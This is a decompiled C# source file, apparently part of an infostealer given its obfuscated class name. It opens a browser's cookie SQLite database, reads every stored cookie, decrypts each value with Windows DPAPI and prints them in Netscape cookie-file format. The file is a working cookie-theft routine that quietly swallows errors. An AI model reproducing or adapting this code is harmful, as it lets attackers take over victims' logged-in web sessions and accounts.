using System;
using System.Collections.Generic;
using System.Data;
using System.Data.SQLite;
using System.IO;
using System.Text;

namespace Dodjins
{
	// Token: 0x0200002B RID: 43
	public class eod91kk
	{
		// Token: 0x060000E5 RID: 229 RVA: 0x000066C3 File Offset: 0x000048C3
		public eod91kk(string _cookiePath)
		{
			this.CookiePath = _cookiePath;
		}

		// Token: 0x060000E6 RID: 230 RVA: 0x000066E0 File Offset: 0x000048E0
		public string[] Cookies()
		{
			string[] result;
			try
			{
				bool flag = !File.Exists(this.CookiePath);
				if (flag)
				{
					result = new string[0];
				}
				else
				{
					List<string> list = new List<string>();
					string text = "Data Source = " + this.CookiePath;
					string text2 = "SELECT* FROM cookies";
					byte[] entropyBytes = null;
					DataTable dataTable = new DataTable();
					string text3 = text2;
					using (SQLiteConnection sqliteConnection = new SQLiteConnection(text))
					{
						SQLiteCommand sqliteCommand = new SQLiteCommand(text3, sqliteConnection);
						SQLiteDataAdapter sqliteDataAdapter = new SQLiteDataAdapter(sqliteCommand);
						sqliteDataAdapter.Fill(dataTable);
					}
					for (int i = 0; i < dataTable.Rows.Count; i++)
					{
						byte[] cipherTextBytes = (byte[])dataTable.Rows[i][12];
						string empty = string.Empty;
						byte[] bytes = DPAPI.Decrypt(cipherTextBytes, entropyBytes, out empty);
						List<string> values = new List<string>
						{
							dataTable.Rows[i][1].ToString(),
							(dataTable.Rows[i][7].ToString() == "0") ? "FALSE" : "TRUE",
							dataTable.Rows[i][4].ToString(),
							(dataTable.Rows[i][6].ToString() == "0") ? "FALSE" : "TRUE",
							dataTable.Rows[i][5].ToString(),
							dataTable.Rows[i][2].ToString(),
							new UTF8Encoding(true).GetString(bytes)
						};
						list.Add(string.Join("\t", values));
					}
					result = list.ToArray();
				}
			}
			catch (Exception ex)
			{
				result = new string[0];
			}
			return result;
		}

		// Token: 0x0400007F RID: 127
		private string CookiePath = string.Empty;
	}
}
